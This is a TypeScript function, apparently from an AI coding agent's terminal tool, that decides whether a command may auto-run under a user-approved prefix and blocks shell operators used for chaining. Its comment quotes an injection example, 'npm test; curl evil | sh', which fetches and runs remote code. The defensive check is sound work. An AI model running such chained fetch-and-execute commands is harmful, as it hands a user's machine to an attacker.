/**
 * Whether a command may auto-run under a user's session allow-prefix
 * (terminal-git spec §1). Allowing "npm test" must NOT also silently auto-run
 * "npm test; curl evil | sh": a prefix match alone is unsafe. So we require a
 * clean prefix match AND the absence of shell control operators that would
 * chain, pipe, redirect, or command-substitute beyond the approved prefix.
 * Anything with those falls back to a manual gate.
 */
const SHELL_OPERATORS = /[;&|`>\n]|\$\(|\|\||&&/

export function commandMatchesAllowedPrefix(command: string, prefixes: string[]): boolean {
  const trimmed = command.trim()
  if (SHELL_OPERATORS.test(trimmed)) return false
  return prefixes.some((p) => {
    const prefix = p.trim()
    if (prefix === '') return false
    // Exact, or the prefix followed by a word boundary (space) — so "npm"
    // matches "npm test" but not "npmrc-exfil".
    return trimmed === prefix || trimmed.startsWith(prefix + ' ')
  })
}
